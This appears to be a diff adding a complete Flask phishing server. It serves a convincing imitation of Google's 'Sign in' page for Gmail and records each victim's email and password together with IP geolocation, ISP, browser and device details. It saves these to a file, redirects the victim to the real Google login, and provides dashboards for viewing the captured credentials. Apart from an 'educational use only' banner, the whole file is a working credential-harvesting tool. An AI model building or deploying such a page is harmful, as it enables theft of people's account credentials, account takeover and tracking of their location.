@@ -1,0 +1,621 @@
+from flask import Flask, request, render_template_string, redirect
+import requests
+from datetime import datetime
+import ipaddress
+import re
+
+app = Flask(__name__)
+
+# Google endpoints
+GOOGLE_AUTH = "https://accounts.google.com/ServiceLoginAuth"
+GOOGLE_LOGIN = "https://accounts.google.com/ServiceLogin"
+
+# ============ GEOLOCATION & DEVICE FUNCTIONS ============
+
+def get_real_ip():
+    """Get real IP behind proxies"""
+    forwarded = request.headers.get('X-Forwarded-For')
+    if forwarded:
+        return forwarded.split(',')[0].strip()
+    
+    cf_ip = request.headers.get('CF-Connecting-IP')
+    if cf_ip:
+        return cf_ip
+    
+    real_ip = request.headers.get('X-Real-IP')
+    if real_ip:
+        return real_ip
+    
+    return request.remote_addr
+
+def is_private_ip(ip):
+    """Check if IP is private/local"""
+    try:
+        return ipaddress.ip_address(ip).is_private
+    except:
+        return True
+
+def get_geo_info(ip):
+    """Get geolocation and ISP info"""
+    if is_private_ip(ip):
+        return {
+            'ip': ip,
+            'city': 'Private/Local',
+            'region': 'Private',
+            'country': 'Private',
+            'isp': 'Private Network',
+            'org': 'Private',
+            'timezone': 'Local',
+            'loc': '0,0'
+        }
+    
+    try:
+        res = requests.get(
+            f"http://ip-api.com/json/{ip}?fields=status,message,city,region,country,isp,org,timezone,lat,lon",
+            timeout=5
+        )
+        data = res.json()
+        
+        if data.get('status') == 'success':
+            return {
+                'ip': ip,
+                'city': data.get('city', 'Unknown'),
+                'region': data.get('region', 'Unknown'),
+                'country': data.get('country', 'Unknown'),
+                'isp': data.get('isp', 'Unknown'),
+                'org': data.get('org', 'Unknown'),
+                'timezone': data.get('timezone', 'Unknown'),
+                'loc': f"{data.get('lat', 0)},{data.get('lon', 0)}"
+            }
+        else:
+            return {
+                'ip': ip,
+                'city': 'Unknown',
+                'region': 'Unknown',
+                'country': 'Unknown',
+                'isp': 'Unknown',
+                'org': 'Unknown',
+                'timezone': 'Unknown',
+                'loc': '0,0'
+            }
+    except Exception as e:
+        return {
+            'ip': ip,
+            'city': 'Error',
+            'region': 'Error',
+            'country': 'Error',
+            'isp': 'Error',
+            'org': 'Error',
+            'timezone': 'Error',
+            'loc': '0,0'
+        }
+
+def get_browser_info(user_agent):
+    """Extract browser, OS, and device info from User-Agent"""
+    ua = user_agent.lower()
+    
+    # ========== BROWSER DETECTION ==========
+    if 'chrome' in ua and 'edg' not in ua and 'opr' not in ua and 'whatsapp' not in ua:
+        browser = 'Google Chrome'
+        browser_version = 'Unknown'
+        chrome_match = re.search(r'chrome/(\d+\.\d+\.\d+\.\d+)', ua)
+        if chrome_match:
+            browser_version = chrome_match.group(1)
+    elif 'firefox' in ua:
+        browser = 'Mozilla Firefox'
+        browser_version = 'Unknown'
+        firefox_match = re.search(r'firefox/(\d+\.\d+)', ua)
+        if firefox_match:
+            browser_version = firefox_match.group(1)
+    elif 'safari' in ua and 'chrome' not in ua:
+        browser = 'Apple Safari'
+        browser_version = 'Unknown'
+        safari_match = re.search(r'version/(\d+\.\d+\.\d+)', ua)
+        if safari_match:
+            browser_version = safari_match.group(1)
+    elif 'edg' in ua:
+        browser = 'Microsoft Edge'
+        browser_version = 'Unknown'
+        edge_match = re.search(r'edg/(\d+\.\d+\.\d+\.\d+)', ua)
+        if edge_match:
+            browser_version = edge_match.group(1)
+    elif 'opr' in ua or 'opera' in ua:
+        browser = 'Opera'
+        browser_version = 'Unknown'
+        opera_match = re.search(r'opr/(\d+\.\d+\.\d+\.\d+)', ua)
+        if opera_match:
+            browser_version = opera_match.group(1)
+    elif 'whatsapp' in ua:
+        browser = 'WhatsApp Browser'
+        browser_version = 'Unknown'
+    elif 'telegram' in ua:
+        browser = 'Telegram Browser'
+        browser_version = 'Unknown'
+    elif 'instagram' in ua:
+        browser = 'Instagram Browser'
+        browser_version = 'Unknown'
+    elif 'facebook' in ua:
+        browser = 'Facebook Browser'
+        browser_version = 'Unknown'
+    elif 'bot' in ua or 'crawler' in ua or 'spider' in ua:
+        browser = 'Bot/Crawler'
+        browser_version = 'Unknown'
+    else:
+        browser = 'Unknown Browser'
+        browser_version = 'Unknown'
+    
+    # ========== OS DETECTION ==========
+    if 'windows 10' in ua:
+        os = 'Windows 10'
+    elif 'windows 11' in ua:
+        os = 'Windows 11'
+    elif 'windows' in ua and 'phone' in ua:
+        os = 'Windows Phone'
+    elif 'windows' in ua:
+        os = 'Windows'
+    elif 'android' in ua:
+        os = 'Android'
+        android_match = re.search(r'android (\d+\.\d+)', ua)
+        if android_match:
+            os = f'Android {android_match.group(1)}'
+    elif 'iphone' in ua or 'ipad' in ua:
+        if 'iphone' in ua:
+            os = 'iOS (iPhone)'
+        else:
+            os = 'iOS (iPad)'
+        ios_match = re.search(r'os (\d+_\d+_\d+)', ua)
+        if ios_match:
+            os = f'iOS {ios_match.group(1).replace("_", ".")}'
+    elif 'mac os' in ua:
+        os = 'macOS'
+        mac_match = re.search(r'mac os x (\d+_\d+_\d+)', ua)
+        if mac_match:
+            os = f'macOS {mac_match.group(1).replace("_", ".")}'
+    elif 'linux' in ua:
+        os = 'Linux'
+    else:
+        os = 'Unknown OS'
+    
+    # ========== DEVICE TYPE DETECTION ==========
+    if 'mobile' in ua or 'iphone' in ua or ('android' in ua and 'tablet' not in ua):
+        device_type = 'Mobile Phone'
+    elif 'tablet' in ua or 'ipad' in ua:
+        device_type = 'Tablet'
+    elif 'windows' in ua or 'mac' in ua or 'linux' in ua:
+        device_type = 'Desktop Computer'
+    else:
+        device_type = 'Unknown Device'
+    
+    # ========== DEVICE MODEL ==========
+    device_model = 'Unknown'
+    
+    # iPhone models
+    if 'iphone' in ua:
+        iphone_models = {
+            'iphone16': 'iPhone 16',
+            'iphone15': 'iPhone 15',
+            'iphone14': 'iPhone 14',
+            'iphone13': 'iPhone 13',
+            'iphone12': 'iPhone 12',
+            'iphone11': 'iPhone 11',
+            'iphone xs': 'iPhone XS',
+            'iphone xr': 'iPhone XR',
+            'iphone x': 'iPhone X',
+            'iphone 8': 'iPhone 8',
+            'iphone 7': 'iPhone 7',
+            'iphone 6': 'iPhone 6',
+            'iphone 5': 'iPhone 5',
+            'iphone 4': 'iPhone 4'
+        }
+        for key, model in iphone_models.items():
+            if key in ua:
+                device_model = model
+                break
+    
+    # Samsung
+    if 'samsung' in ua or 'sm-' in ua:
+        samsung_match = re.search(r'sm-([a-z0-9]+)', ua)
+        if samsung_match:
+            device_model = f'Samsung Galaxy {samsung_match.group(1).upper()}'
+        else:
+            device_model = 'Samsung Galaxy'
+    
+    # Google Pixel
+    if 'pixel' in ua:
+        pixel_match = re.search(r'pixel (\d+)', ua)
+        if pixel_match:
+            device_model = f'Google Pixel {pixel_match.group(1)}'
+        else:
+            device_model = 'Google Pixel'
+    
+    # OnePlus
+    if 'oneplus' in ua:
+        oneplus_match = re.search(r'oneplus (\d+)', ua)
+        if oneplus_match:
+            device_model = f'OnePlus {oneplus_match.group(1)}'
+        else:
+            device_model = 'OnePlus'
+    
+    return {
+        'browser': browser,
+        'browser_version': browser_version,
+        'os': os,
+        'device_type': device_type,
+        'device_model': device_model,
+        'full_ua': user_agent
+    }
+
+# ============ HTML LOGIN PAGE WITH GOOGLE LOGO ============
+
+LOGIN_PAGE = '''
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', Roboto, Arial, sans-serif; 
+            background: #fff; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            margin: 0;
+        }
+        .container { 
+            width: 100%; 
+            max-width: 450px; 
+            padding: 20px; 
+        }
+        .card { 
+            border: 1px solid #dadce0; 
+            border-radius: 8px; 
+            padding: 48px 40px 36px; 
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1); 
+        }
+        .logo { 
+            text-align: center; 
+            margin-bottom: 25px; 
+        }
+        .logo img { 
+            width: 75px; 
+            height: 75px; 
+        }
+        .google-text {
+            text-align: center;
+            font-size: 22px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 5px;
+        }
+        .title { 
+            font-size: 24px; 
+            font-weight: 400; 
+            text-align: center; 
+            margin-bottom: 10px; 
+        }
+        .subtitle { 
+            text-align: center; 
+            color: #5f6368; 
+            margin-bottom: 25px; 
+            font-size: 14px;
+        }
+        .input-group { 
+            margin-bottom: 15px; 
+        }
+        .input-group input { 
+            width: 100%; 
+            padding: 13px 15px; 
+            border: 1px solid #dadce0; 
+            border-radius: 4px; 
+            font-size: 16px; 
+            transition: border 0.2s; 
+        }
+        .input-group input:focus { 
+            border-color: #1a73e8; 
+            outline: none; 
+            box-shadow: 0 1px 3px rgba(26,115,232,0.3); 
+        }
+        .btn { 
+            width: 100%; 
+            padding: 12px; 
+            background: #1a73e8; 
+            color: white; 
+            border: none; 
+            border-radius: 4px; 
+            font-size: 16px; 
+            cursor: pointer; 
+            font-weight: 500; 
+        }
+        .btn:hover { 
+            background: #1557b0; 
+        }
+        .footer { 
+            text-align: center; 
+            margin-top: 20px; 
+            font-size: 14px; 
+            color: #5f6368; 
+        }
+        .footer a { 
+            color: #1a73e8; 
+            text-decoration: none; 
+        }
+        .footer a:hover { 
+            text-decoration: underline; 
+        }
+        .error { 
+            color: #d93025; 
+            text-align: center; 
+            display: none; 
+        }
+        .learn-more {
+            text-align: center;
+            font-size: 12px;
+            color: #5f6368;
+            margin-top: 20px;
+        }
+        .learn-more a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="logo">
+                <!-- Google Logo -->
+                <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="Google">
+            </div>
+            <div class="google-text">Google</div>
+            <h1 class="title">Sign in</h1>
+            <p class="subtitle">to continue to Gmail</p>
+            <div id="error" class="error">Invalid email or password</div>
+            <form method="POST" action="/login">
+                <div class="input-group">
+                    <input type="email" name="Email" placeholder="Email or phone" required autofocus>
+                </div>
+                <div class="input-group">
+                    <input type="password" name="Passwd" placeholder="Password" required>
+                </div>
+                <button type="submit" class="btn">Next</button>
+            </form>
+            <div class="footer">
+                <a href="#">Create account</a> · <a href="#">Forgot email?</a>
+            </div>
+            <div class="learn-more">
+                <a href="#">Learn more</a> · <a href="#">Help</a> · <a href="#">Privacy</a> · <a href="#">Terms</a>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
+'''
+
+# ============ ROUTES ============
+
+@app.route('/')
+def index():
+    """Log visitor info and show login page"""
+    ip = get_real_ip()
+    geo = get_geo_info(ip)
+    user_agent = request.headers.get('User-Agent', 'Unknown')
+    browser_info = get_browser_info(user_agent)
+    
+    # Log to file
+    with open('visitors_log.txt', 'a') as f:
+        f.write(f"\n{'='*60}\n")
+        f.write(f"TIME: {datetime.now()}\n")
+        f.write(f"IP: {ip}\n")
+        f.write(f"CITY: {geo['city']}\n")
+        f.write(f"REGION: {geo['region']}\n")
+        f.write(f"COUNTRY: {geo['country']}\n")
+        f.write(f"ISP: {geo['isp']}\n")
+        f.write(f"ORG: {geo['org']}\n")
+        f.write(f"TIMEZONE: {geo['timezone']}\n")
+        f.write(f"BROWSER: {browser_info['browser']} {browser_info['browser_version']}\n")
+        f.write(f"OS: {browser_info['os']}\n")
+        f.write(f"DEVICE TYPE: {browser_info['device_type']}\n")
+        f.write(f"DEVICE MODEL: {browser_info['device_model']}\n")
+        f.write(f"FULL USER-AGENT: {user_agent}\n")
+        f.write(f"{'='*60}\n")
+    
+    print(f"\n{'='*60}")
+    print(f"[+] NEW VISITOR")
+    print(f"{'='*60}")
+    print(f"[+] IP: {ip}")
+    print(f"[+] LOCATION: {geo['city']}, {geo['country']}")
+    print(f"[+] ISP: {geo['isp']}")
+    print(f"[+] BROWSER: {browser_info['browser']} {browser_info['browser_version']}")
+    print(f"[+] OS: {browser_info['os']}")
+    print(f"[+] DEVICE: {browser_info['device_model']} ({browser_info['device_type']})")
+    print(f"{'='*60}")
+    
+    return render_template_string(LOGIN_PAGE)
+
+@app.route('/login', methods=['POST'])
+def login():
+    """Handle login and log credentials with geo info"""
+    email = request.form.get('Email')
+    password = request.form.get('Passwd')
+    ip = get_real_ip()
+    geo = get_geo_info(ip)
+    user_agent = request.headers.get('User-Agent', 'Unknown')
+    browser_info = get_browser_info(user_agent)
+    
+    # ========== PRINT EVERYTHING INCLUDING PASSWORD ==========
+    print(f"\n{'='*60}")
+    print(f"[!!!] 🔐 CREDENTIALS CAPTURED!")
+    print(f"{'='*60}")
+    print(f"[!!!] 📧 EMAIL: {email}")
+    print(f"[!!!] 🔑 PASSWORD: {password}")
+    print(f"{'='*60}")
+    print(f"[+] 🌍 IP: {ip}")
+    print(f"[+] 📍 LOCATION: {geo['city']}, {geo['region']}, {geo['country']}")
+    print(f"[+] 🏢 ISP: {geo['isp']}")
+    print(f"[+] 🌐 BROWSER: {browser_info['browser']} {browser_info['browser_version']}")
+    print(f"[+] 💻 OS: {browser_info['os']}")
+    print(f"[+] 📱 DEVICE: {browser_info['device_model']} ({browser_info['device_type']})")
+    print(f"[+] ⏰ TIME: {datetime.now()}")
+    print(f"{'='*60}")
+    
+    # Save credentials with full info
+    with open('captured_creds.txt', 'a') as f:
+        f.write(f"\n{'='*60}\n")
+        f.write(f"TIME: {datetime.now()}\n")
+        f.write(f"EMAIL: {email}\n")
+        f.write(f"PASSWORD: {password}\n")
+        f.write(f"IP: {ip}\n")
+        f.write(f"CITY: {geo['city']}\n")
+        f.write(f"REGION: {geo['region']}\n")
+        f.write(f"COUNTRY: {geo['country']}\n")
+        f.write(f"ISP: {geo['isp']}\n")
+        f.write(f"ORG: {geo['org']}\n")
+        f.write(f"BROWSER: {browser_info['browser']} {browser_info['browser_version']}\n")
+        f.write(f"OS: {browser_info['os']}\n")
+        f.write(f"DEVICE TYPE: {browser_info['device_type']}\n")
+        f.write(f"DEVICE MODEL: {browser_info['device_model']}\n")
+        f.write(f"USER-AGENT: {user_agent}\n")
+        f.write(f"{'='*60}\n")
+    
+    print(f"[+] ✅ Credentials saved to captured_creds.txt")
+    
+    # Redirect to real Google
+    return redirect('https://accounts.google.com/ServiceLogin')
+
+@app.route('/view')
+def view():
+    """View all captured logs"""
+    output = []
+    files = ['visitors_log.txt', 'captured_creds.txt']
+    for f in files:
+        try:
+            with open(f, 'r') as file:
+                output.append(f"\n{'='*40}\n")
+                output.append(f"FILE: {f}\n")
+                output.append(f"{'='*40}\n")
+                output.append(file.read())
+        except:
+            output.append(f"\n{'='*40}\n")
+            output.append(f"FILE: {f}\n")
+            output.append(f"{'='*40}\n")
+            output.append("No data yet\n")
+    
+    return f'''
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Log Viewer</title>
+        <style>
+            body {{ font-family: 'Courier New', monospace; background: #1e1e1e; color: #d4d4d4; padding: 20px; }}
+            .file {{ background: #2d2d2d; padding: 20px; border-radius: 8px; margin-bottom: 30px; }}
+            .file-header {{ color: #569cd6; font-size: 18px; font-weight: bold; }}
+            .content {{ white-space: pre-wrap; word-wrap: break-word; color: #d4d4d4; }}
+            .password {{ color: #f48771; font-weight: bold; }}
+        </style>
+    </head>
+    <body>
+        <h1 style="color: #4ec9b0;">📊 Captured Data</h1>
+        {"".join(output)}
+    </body>
+    </html>
+    '''
+
+@app.route('/stats')
+def stats():
+    """Show statistics"""
+    try:
+        with open('visitors_log.txt', 'r') as f:
+            content = f.read()
+            visitor_count = content.count('TIME:')
+        
+        with open('captured_creds.txt', 'r') as f:
+            cred_content = f.read()
+            cred_count = cred_content.count('EMAIL:')
+        
+        return f'''
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Statistics</title>
+            <style>
+                body {{ font-family: Arial, sans-serif; background: #1e1e1e; color: white; padding: 40px; }}
+                .stat {{ background: #2d2d2d; padding: 20px; border-radius: 8px; margin: 10px 0; }}
+                .number {{ font-size: 48px; font-weight: bold; color: #4ec9b0; }}
+            </style>
+        </head>
+        <body>
+            <h1>📊 Statistics</h1>
+            <div class="stat">
+                <h2>Total Visitors</h2>
+                <div class="number">{visitor_count}</div>
+            </div>
+            <div class="stat">
+                <h2>Credentials Captured</h2>
+                <div class="number">{cred_count}</div>
+            </div>
+        </body>
+        </html>
+        '''
+    except:
+        return "No data yet"
+
+@app.route('/recent')
+def recent():
+    """Show only the most recent capture"""
+    try:
+        with open('captured_creds.txt', 'r') as f:
+            content = f.read()
+            # Get the last capture
+            captures = content.split('='*60)
+            if len(captures) > 1:
+                last = captures[-1]
+                return f'''
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title>Recent Capture</title>
+                    <style>
+                        body {{ font-family: 'Courier New', monospace; background: #1e1e1e; color: #d4d4d4; padding: 20px; }}
+                        .data {{ background: #2d2d2d; padding: 20px; border-radius: 8px; }}
+                        .label {{ color: #569cd6; }}
+                        .value {{ color: #4ec9b0; }}
+                        .password {{ color: #f48771; font-weight: bold; font-size: 18px; }}
+                    </style>
+                </head>
+                <body>
+                    <h1 style="color: #4ec9b0;">🔐 Most Recent Capture</h1>
+                    <div class="data">
+                        <pre>{last}</pre>
+                    </div>
+                </body>
+                </html>
+                '''
+    except:
+        return "No data yet"
+
+if __name__ == '__main__':
+    print("\n" + "="*60)
+    print("🔐 EDUCATIONAL PHISHING + GEOLOCATION LOGGER")
+    print("="*60)
+    print("✅ IP Geolocation")
+    print("✅ ISP Detection")
+    print("✅ Browser Detection (Chrome, Firefox, Safari, Edge, Opera, etc.)")
+    print("✅ OS Detection (Windows, macOS, Linux, Android, iOS)")
+    print("✅ Device Type (Mobile, Tablet, Desktop)")
+    print("✅ Device Model (iPhone 6, Samsung Galaxy, Google Pixel, etc.)")
+    print("✅ Credential Capture with PASSWORD DISPLAY")
+    print("✅ Google Logo Displayed")
+    print("="*60)
+    print("\n[+] Server: http://localhost:5000")
+    print("[+] View Logs: http://localhost:5000/view")
+    print("[+] Stats: http://localhost:5000/stats")
+    print("[+] Recent Capture: http://localhost:5000/recent")
+    print("\n[!] FOR EDUCATIONAL USE ONLY - Test in sandbox!")
+    print("[!] Passwords will be printed in console and saved!")
+    print("="*60)
+    
+    app.run(host='0.0.0.0', port=5000, debug=True)
